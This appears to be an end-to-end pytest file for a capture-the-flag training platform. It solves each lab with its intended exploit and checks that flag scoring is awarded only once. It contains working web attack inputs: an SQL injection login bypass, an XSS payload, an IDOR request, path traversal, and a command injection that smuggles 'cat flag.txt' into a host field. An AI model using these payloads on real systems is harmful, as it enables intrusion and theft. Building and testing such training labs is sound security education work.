"""End-to-end solve tests: for every seed challenge we perform the INTENDED
exploit against the live lab, capture the per-session flag, submit it to the
secure platform API, and assert points are awarded exactly once.

A challenge is only considered implemented if its test here passes.
"""
from __future__ import annotations

import base64
import codecs
import re

import pytest

from conftest import auth_headers, register, start_lab, submit_flag

FLAG_RE = re.compile(r"MYCTF\{[^}]+\}")


def _lab(instance_id: str, sub: str = "") -> str:
    return f"/labs/{instance_id}/{sub}"


def _find_flag(text: str) -> str:
    m = FLAG_RE.search(text)
    assert m, f"no flag found in lab response:\n{text[:500]}"
    return m.group(0)


def _solve_and_assert(client, token, slug, flag, expected_points):
    r = submit_flag(client, token, slug, flag)
    body = r.get_json()
    assert r.status_code == 200, body
    assert body["correct"] is True
    assert body["awarded"] == expected_points, body
    # second submission must NOT award again (idempotent scoring)
    r2 = submit_flag(client, token, slug, flag)
    assert r2.get_json()["already_solved"] is True
    assert r2.get_json()["awarded"] == 0


# --------------------------------------------------------------------- tests
def test_http_basics(client, user):
    token = user["token"]
    iid = start_lab(client, token, "http-basics")
    # wrong method -> 405 with Allow header
    assert client.get(_lab(iid, "flag"), headers=auth_headers(token)).status_code == 405
    # correct exploit: POST with the required header
    r = client.post(_lab(iid, "flag"), headers={**auth_headers(token),
                                                 "X-MyCTF-Access": "let-me-in"})
    assert r.status_code == 200
    flag = _find_flag(r.get_data(as_text=True))
    _solve_and_assert(client, token, "http-basics", flag, 50)


def test_encoding_decoding(client, user):
    token = user["token"]
    iid = start_lab(client, token, "encoding-decoding")
    page = client.get(_lab(iid), headers=auth_headers(token)).get_data(as_text=True)
    blob = re.search(r'<pre id="blob">([^<]+)</pre>', page).group(1).strip()
    decoded = codecs.encode(base64.b64decode(blob).decode(), "rot_13")
    assert FLAG_RE.fullmatch(decoded), decoded
    _solve_and_assert(client, token, "encoding-decoding", decoded, 50)


def test_sqli_login_bypass(client, user):
    token = user["token"]
    iid = start_lab(client, token, "sqli-login-bypass")
    # authentication bypass payload
    r = client.post(_lab(iid, "login"), headers=auth_headers(token),
                    data={"username": "' OR '1'='1' -- ", "password": "x"})
    flag = _find_flag(r.get_data(as_text=True))
    _solve_and_assert(client, token, "sqli-login-bypass", flag, 100)


def test_reflected_xss(client, user):
    token = user["token"]
    iid = start_lab(client, token, "reflected-xss")
    r = client.get(_lab(iid), headers=auth_headers(token),
                   query_string={"q": "<img src=x onerror=myctfSolve()>"})
    flag = _find_flag(r.get_data(as_text=True))
    _solve_and_assert(client, token, "reflected-xss", flag, 100)


def test_reflected_xss_rejects_escaped_or_inert_input(client, user):
    """A non-executing query must NOT reveal the flag."""
    token = user["token"]
    iid = start_lab(client, token, "reflected-xss")
    r = client.get(_lab(iid), headers=auth_headers(token),
                   query_string={"q": "just a normal search"})
    assert not FLAG_RE.search(r.get_data(as_text=True))


def test_idor_profile_access(client, user):
    token = user["token"]
    iid = start_lab(client, token, "idor-profile-access")
    # the target account the learner should not be able to read
    r = client.get(_lab(iid, "api/account/1002"), headers=auth_headers(token))
    assert r.status_code == 200
    flag = _find_flag(r.get_data(as_text=True))
    _solve_and_assert(client, token, "idor-profile-access", flag, 100)


def test_path_traversal(client, user):
    token = user["token"]
    iid = start_lab(client, token, "path-traversal")
    r = client.get(_lab(iid), headers=auth_headers(token),
                   query_string={"file": "../secret/flag.txt"})
    flag = _find_flag(r.get_data(as_text=True))
    _solve_and_assert(client, token, "path-traversal", flag, 100)


def test_command_injection(client, user):
    token = user["token"]
    iid = start_lab(client, token, "command-injection")
    r = client.get(_lab(iid), headers=auth_headers(token),
                   query_string={"host": "127.0.0.1; cat flag.txt"})
    flag = _find_flag(r.get_data(as_text=True))
    _solve_and_assert(client, token, "command-injection", flag, 200)


@pytest.mark.parametrize("slug", [
    "http-basics", "encoding-decoding", "sqli-login-bypass", "reflected-xss",
    "idor-profile-access", "path-traversal", "command-injection",
])
def test_wrong_flag_is_rejected(client, user, slug):
    token = user["token"]
    start_lab(client, token, slug)
    r = submit_flag(client, token, slug, "MYCTF{not_the_flag}")
    assert r.status_code == 400
    assert r.get_json()["correct"] is False
